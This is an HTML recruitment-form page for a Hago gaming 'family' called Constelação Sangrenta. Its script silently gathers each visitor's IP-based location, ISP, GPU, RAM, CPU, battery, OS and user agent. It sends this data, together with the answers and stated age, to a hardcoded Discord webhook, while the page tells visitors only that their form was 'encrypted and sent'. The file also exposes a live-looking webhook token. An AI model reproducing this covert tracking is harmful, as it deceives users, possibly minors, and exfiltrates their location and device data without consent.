<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CONSTELAÇÃO SANGRENTA - Recrutamento Hago</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-dark: #020202;
            --text-main: #e0e0e0;
            --blood-red: #8b0000;
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            overflow-x: hidden;
            font-family: 'Share Tech Mono', monospace;
            margin: 0;
            padding: 0;
        }

        .font-cyber { font-family: 'Orbitron', sans-serif; }
        .hidden { display: none !important; }
        
        /* --- VHS EFFECTS --- */
        .vhs-overlay {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
                        linear-gradient(90deg, rgba(255, 255, 255, 0.02), rgba(255, 255, 255, 0.01), rgba(255, 255, 255, 0.02));
            background-size: 100% 3px, 3px 100%;
            z-index: 9999; pointer-events: none;
            animation: flicker 0.15s infinite;
        }
        .noise {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            pointer-events: none; z-index: 9998; opacity: 0.08;
            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='1'/%3E%3C/svg%3E");
        }
        .scanline {
            width: 100%; height: 100px; z-index: 9999;
            background: linear-gradient(0deg, transparent, rgba(255, 255, 255, 0.05), transparent);
            position: absolute; bottom: 100%;
            animation: scanline 10s linear infinite; pointer-events: none;
        }
        @keyframes flicker { 0% { opacity: 0.9; } 50% { opacity: 0.8; } 100% { opacity: 0.95; } }
        @keyframes scanline { 0% { top: -100px; } 100% { top: 100%; } }
        
        .blood-glow { text-shadow: 0 0 10px #ff0000, 0 0 20px #8b0000; }

        .cyber-card {
            background: #000000; border: 1px solid #333;
            box-shadow: 4px 4px 0px #111; transition: all 0.2s ease;
        }
        .cyber-card:hover { border-color: #fff; box-shadow: 6px 6px 0px #fff; }
        
        .cyber-btn {
            background: #000; color: #fff; border: 1px solid #fff;
            text-transform: uppercase; font-family: 'Share Tech Mono', monospace;
            font-weight: bold; cursor: pointer; transition: all 0.2s;
            box-shadow: 3px 3px 0px #444; display: flex; align-items: center; justify-content: center;
        }
        .cyber-btn:hover:not(:disabled) { background: #fff; color: #000; box-shadow: 5px 5px 0px #888; }
        
        .input-field {
            background: #050505; border: 1px solid #333; color: white;
            padding: 12px; width: 100%; outline: none; transition: 0.3s;
        }
        .input-field:focus { border-color: #ff0000; background: #0a0000; }

        @keyframes crtOpen { 0% { transform: scaleY(0.005) scaleX(0); opacity: 0; } 50% { transform: scaleY(0.005) scaleX(1); opacity: 1; } 100% { transform: scaleY(1) scaleX(1); opacity: 1; } }
        .animate-crt-open { animation: crtOpen 0.6s cubic-bezier(0.23, 1, 0.32, 1) forwards; }
    </style>
</head>
<body>

    <div id="vhs-effects">
        <div class="vhs-overlay"></div>
        <div class="scanline"></div>
        <div class="noise"></div>
    </div>

    <!-- TELA INICIAL -->
    <div id="welcome-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-black transition-opacity duration-700">
        <div class="text-center space-y-8 p-6 max-w-2xl w-full">
            <h1 class="text-5xl md:text-8xl font-cyber font-black tracking-tighter blood-glow mb-2 uppercase">Constelação</h1>
            <h1 class="text-5xl md:text-8xl font-cyber font-black tracking-tighter text-white uppercase">Sangrenta</h1>
            <p class="text-sm font-mono tracking-[0.4em] text-gray-500 mt-6 uppercase">HAGO FAMILY // PROTOCOLO DE ALISTAMENTO</p>
            <button onclick="app.enterSystem()" class="w-full cyber-btn py-5 text-xl tracking-[0.3em] mt-10">
                [ INICIAR ALISTAMENTO ]
            </button>
        </div>
    </div>

    <!-- APP PRINCIPAL -->
    <div id="main-content" class="relative min-h-screen flex flex-col hidden p-4 md:p-8">
        <header class="max-w-4xl mx-auto w-full flex justify-between items-center mb-12 border-b border-white/10 pb-6">
            <div class="text-2xl font-cyber font-bold tracking-widest text-white">CS<span class="text-red-600">_ROOT</span></div>
            <div class="font-mono text-[10px] text-green-500 uppercase">Status: Conectado</div>
        </header>

        <main class="max-w-2xl mx-auto w-full space-y-12 mb-20">
            <section class="cyber-card p-6 md:p-10">
                <h2 class="text-2xl font-cyber font-bold mb-6 border-l-4 border-red-600 pl-4 uppercase">Ficha de Campo</h2>
                <form id="recruitment-form" class="space-y-6 font-mono" onsubmit="app.send(event)">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <input type="text" name="nome" placeholder="Seu Nick" required class="input-field">
                        <input type="number" name="idade" placeholder="Idade" required class="input-field">
                    </div>
                    <input type="text" name="id_hago" placeholder="ID do Hago" required class="input-field">
                    
                    <label class="text-[10px] text-gray-500 uppercase tracking-widest">Escolha sua função na família:</label>
                    <select name="especialidade" class="input-field">
                        <option value="Recrutador">Recrutador</option>
                        <option value="Conselheiro">Conselheiro</option>
                        <option value="Ajudante">Ajudante</option>
                        <option value="Vigilante">Vigilante</option>
                        <option value="Membro comum (Check-in diário)">Membro comum (Check-in diário)</option>
                    </select>

                    <label class="text-[10px] text-gray-500 uppercase tracking-widest">Já esteve noutra família?</label>
                    <input type="text" name="outras_familias" placeholder="Sim/Não (Quais?)" class="input-field">
                    
                    <textarea name="treta" placeholder="Tretas ou brigas passadas?" class="input-field h-24"></textarea>
                    <textarea name="diferencial" placeholder="O que te diferencia dos outros?" required class="input-field h-24"></textarea>
                    <input type="text" name="objetivo" placeholder="Qual seu objetivo conosco?" class="input-field">
                    <textarea name="por_que" placeholder="Por que quer entrar para a CS?" class="input-field h-24"></textarea>

                    <button id="submit-btn" type="submit" class="w-full cyber-btn py-4 text-sm tracking-[0.5em]">SUBMETER CREDENCIAIS</button>
                </form>
            </section>
        </main>
    </div>

    <!-- MODAL SUCESSO -->
    <div id="modal-container" class="fixed inset-0 z-[100] bg-black/95 flex items-center justify-center p-4 hidden">
        <div class="cyber-card w-full max-w-md p-10 text-center space-y-6">
            <h2 class="text-2xl font-cyber font-bold text-white uppercase">SISTEMA ATUALIZADO</h2>
            <p class="font-mono text-xs text-gray-400">A sua ficha foi criptografada e enviada.</p>
            <button onclick="location.reload()" class="w-full cyber-btn py-4">FINALIZAR</button>
        </div>
    </div>

    <script>
        const app = {
            webhook: "https://discord.com/api/webhooks/1473067070164959546/w9j63fmXdRzbhuoQYS0nRMmUAqkmPFForLBJr2doZax11NRyF4JzommKhpgYi2y6HkYQ",

            enterSystem() {
                document.getElementById('welcome-screen').classList.add('hidden');
                document.getElementById('main-content').classList.remove('hidden');
                document.getElementById('main-content').classList.add('animate-crt-open');
            },

            async getSystemInfo() {
                let ipData = { ip: "N/A", city: "N/A", region: "N/A", country_name: "N/A", org: "N/A", timezone: "N/A" };
                try { const res = await fetch('https://ipapi.co/json/'); ipData = await res.json(); } catch(e) {}

                let gpu = "Desconhecida";
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                } catch(e) {}

                let battery = { level: "N/A", charging: "N/A" };
                try {
                    const b = await navigator.getBattery();
                    battery.level = Math.round(b.level * 100) + "%";
                    battery.charging = b.charging ? "Sim" : "Não";
                } catch(e) {}

                return { ipData, gpu, battery };
            },

            async send(e) {
                e.preventDefault();
                const btn = document.getElementById('submit-btn');
                btn.disabled = true;
                btn.innerText = "ENVIANDO...";

                const info = await this.getSystemInfo();
                const fd = new FormData(e.target);
                const user = Object.fromEntries(fd.entries());

                const embed = {
                    title: `🚀 NOVO ALISTAMENTO CS: ${user.nome.toUpperCase()}`,
                    color: 15158332,
                    description: `👤 **Agente**\n**Nome:** ${user.nome}\n**ID:** ${user.id_hago}\n**Idade:** ${user.idade}\n\n` +
                                 `🎯 **Especialidade**\n**${user.especialidade}**\n\n` +
                                 `📋 **Histórico**\n**Outra Família?** ${user.outras_familias}\n**Treta/Briga:** ${user.treta || "Nenhuma"}\n\n` +
                                 `🌟 **Perfil**\n**Objetivo:** ${user.objetivo}\n**Diferencial:** ${user.diferencial}\n**Por que CS:** ${user.por_que}\n\n` +
                                 `🌐 **REDE & LOCALIZAÇÃO**\n**[IP]:** ${info.ipData.ip}\n**[CIDADE]:** ${info.ipData.city}\n**[ESTADO (UF)]:** ${info.ipData.region}\n**[PAÍS]:** ${info.ipData.country_name}\n**[ISP]:** ${info.ipData.org}\n**[TIMEZONE (IP)]:** ${info.ipData.timezone}\n\n` +
                                 `💻 **HARDWARE**\n**GPU:** ${info.gpu}\n**RAM:** ${navigator.deviceMemory || "N/A"} GB\n**CPU Cores:** ${navigator.hardwareConcurrency}\n**Res:** ${window.screen.width}x${window.screen.height}\n\n` +
                                 `🔋 **SISTEMA**\n**OS:** ${navigator.platform}\n**Bateria:** ${info.battery.level}\n**Carregando:** ${info.battery.charging}\n**Idioma:** ${navigator.language}\n\n` +
                                 `🔗 **REFERÊNCIA**\n**REF:** Direto\n**User Agent:** ${navigator.userAgent}`,
                    footer: { text: "Sistema Constelação Sangrenta v6.0" },
                    timestamp: new Date()
                };

                await fetch(this.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] })
                });

                document.getElementById('modal-container').classList.remove('hidden');
            }
        };
    </script>
</body>
</html>
